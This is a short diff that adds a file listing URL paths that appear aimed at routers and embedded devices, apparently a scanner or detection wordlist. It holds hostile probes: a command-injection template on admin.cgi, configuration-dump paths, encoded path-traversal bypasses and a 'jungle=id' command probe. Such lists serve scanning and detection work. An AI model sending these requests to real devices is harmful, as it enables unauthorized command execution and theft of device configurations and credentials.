@@ -1,0 +1,11 @@
+/wlsecurity.html
+/dumpmdm.cmd
+/getcfg.php
+/wan.htm
+/cgi-bin/admin.cgi?Command=sysCommand&Cmd={{cmd}}
+/cgi-bin/export-cgi?category=config&arg0=startup-config.conf
+/ubus/
+/js/..%2f%2f/wizard.htm
+/images/..%2f%2f/wizard.htm
+
+/update.php?jungle=id
